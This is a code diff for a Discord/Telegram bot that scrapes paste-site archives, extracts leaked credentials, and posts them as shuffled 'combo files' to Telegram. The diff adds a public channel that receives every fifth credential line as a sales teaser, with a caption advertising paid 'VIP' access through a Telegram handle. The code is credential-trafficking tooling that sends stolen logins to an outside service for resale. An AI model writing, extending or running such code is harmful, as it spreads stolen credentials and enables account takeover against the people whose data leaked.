@@ -24,8 +24,9 @@ CHANNEL_ID         = int(os.environ["CHANNEL_ID"])          # all found URLs as 
 NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])      # new URL alerts only
 CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"]) # extracted credentials from new pastes
 
-TELEGRAM_TOKEN  = os.environ["TELEGRAM_TOKEN"]
-TELEGRAM_CHAT   = os.environ["TELEGRAM_CHAT"]
+TELEGRAM_TOKEN       = os.environ["TELEGRAM_TOKEN"]
+TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]         # private channel
+TELEGRAM_PUBLIC_CHAT = os.environ["TELEGRAM_PUBLIC_CHAT"]  # public channel
 
 CHECK_INTERVAL = 1
 PAGES_TO_SCAN  = 5
@@ -80,10 +81,11 @@ def extract_credentials(raw: str) -> list[str]:
                 lines.append(line)
     return lines
 
-async def send_telegram_file(text: str, filename: str):
+async def send_telegram_file(text: str, filename: str, chat_id: str = None):
+    chat_id = chat_id or TELEGRAM_CHAT
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
     data = aiohttp.FormData()
-    data.add_field("chat_id", TELEGRAM_CHAT)
+    data.add_field("chat_id", chat_id)
     data.add_field("document", text.encode(), filename=filename, content_type="text/plain")
     try:
         async with aiohttp.ClientSession() as session:
@@ -92,17 +94,17 @@ async def send_telegram_file(text: str, filename: str):
                     body = await resp.text()
                     log.error(f"Telegram API error {resp.status}: {body}")
                 else:
-                    log.info("Posted to Telegram")
+                    log.info(f"Posted file to Telegram [{chat_id}]")
     except Exception as e:
         log.error(f"Failed to send to Telegram: {e}")
 
 
-async def send_telegram_message(text: str):
-    """Send a plain text message to Telegram channel."""
+async def send_telegram_message(text: str, chat_id: str = None):
+    chat_id = chat_id or TELEGRAM_CHAT
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     try:
         async with aiohttp.ClientSession() as session:
-            await session.post(url, json={"chat_id": TELEGRAM_CHAT, "text": text})
+            await session.post(url, json={"chat_id": chat_id, "text": text})
     except Exception as e:
         log.error(f"Failed to send Telegram message: {e}")
 
@@ -308,6 +310,7 @@ async def monitor_loop():
                                 all_creds.append(line)
                     random.shuffle(all_creds)
                     tg_output = tg_header + "\n".join(all_creds)
+                    # Private channel — full file
                     await send_telegram_file(tg_output, filename)
                     tg_caption = (
                         f"{len(all_creds)} COMBO FILE\n"
@@ -315,6 +318,19 @@ async def monitor_loop():
                         "            10 LIFETIME 5 MONTHLY"
                     )
                     await send_telegram_message(tg_caption)
+
+                    # Public channel — every 5th line only
+                    public_creds = all_creds[::5]
+                    if public_creds:
+                        pub_output = tg_header + "\n".join(public_creds)
+                        pub_filename = f"public_{filename}"
+                        await send_telegram_file(pub_output, pub_filename, chat_id=TELEGRAM_PUBLIC_CHAT)
+                        pub_caption = (
+                            f"{len(public_creds)} COMBO FILE\n"
+                            "            BUY MERCURY VIP AT @xn9bowner\n"
+                            "            10 LIFETIME 5 MONTHLY"
+                        )
+                        await send_telegram_message(pub_caption, chat_id=TELEGRAM_PUBLIC_CHAT)
                 else:
                     log.info("Nothing to post to content channel")
 
@@ -336,10 +352,10 @@ async def before_monitor():
 @tree.command(name="scrape", description="Manually trigger a scrape right now")
 @app_commands.describe(pages="Number of archive pages to scan (default: 5)")
 async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
-    await interaction.response.send_message(f"Scanning {pages} page(s)...", ephemeral=True)
+    await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
     channel = bot.get_channel(CHANNEL_ID) or await bot.fetch_channel(CHANNEL_ID)
     await monitor_loop()
-    await interaction.followup.send("Done.", ephemeral=True)
+    await interaction.followup.send("✅ Done.", ephemeral=True)
 
 
 # ─── EVENTS ──────────────────────────────────────────────────────────────────
